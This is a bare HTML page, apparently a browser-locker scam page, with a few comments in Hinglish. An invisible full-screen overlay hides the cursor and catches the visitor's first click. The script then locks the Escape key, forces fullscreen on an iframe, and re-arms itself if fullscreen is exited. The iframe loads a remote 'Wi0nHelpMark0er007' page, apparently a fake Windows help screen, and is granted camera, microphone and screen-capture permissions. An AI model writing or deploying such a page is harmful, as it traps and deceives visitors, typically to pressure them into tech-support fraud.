<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
<title></title>
<style>
  html, body { margin: 0; height: 100%; }

  iframe {
    position: fixed;
    width: 100%;
    height: 100%;
    border: none;
    top: 0;
    left: 0;
    cursor: none;
  }

  #startOverlay {
    position: fixed;
    inset: 0;
    z-index: 9999;
    background: transparent;
    cursor: none;
  }
  #startOverlay.hide { display: none; }
</style>
</head>
<body>

<div id="startOverlay"></div>

<iframe 
  id="f"
  src="https://futurelearners-acavfqc9cpcrhghc.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null"
  allowfullscreen 
  webkitallowfullscreen 
  mozallowfullscreen 
  allow="fullscreen *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *">
</iframe>

<script>
  const frame   = document.getElementById('f');
  const overlay = document.getElementById('startOverlay');

  async function startImmersive() {
    // 1. Keyboard lock (Chrome/Edge) — fail ho toh bhi aage badho
    try {
      if (navigator.keyboard && navigator.keyboard.lock) {
        await navigator.keyboard.lock(['Escape']);
      }
    } catch (e) {
      console.warn('keyboard lock skip:', e);
    }

    // 2. Fullscreen — keyboardLock option ke saath; fail ho toh bina option
    try {
      await frame.requestFullscreen({ keyboardLock: 'browser' });
    } catch (e) {
      try {
        await frame.requestFullscreen();
      } catch (e2) {
        console.error('fullscreen fail:', e2);
        return;
      }
    }

    overlay.classList.add('hide');
  }

  overlay.addEventListener('click', startImmersive);

  document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) {
      if (navigator.keyboard && navigator.keyboard.unlock) {
        navigator.keyboard.unlock();
      }
      overlay.classList.remove('hide');
    }
  });
</script>

</body>
</html>
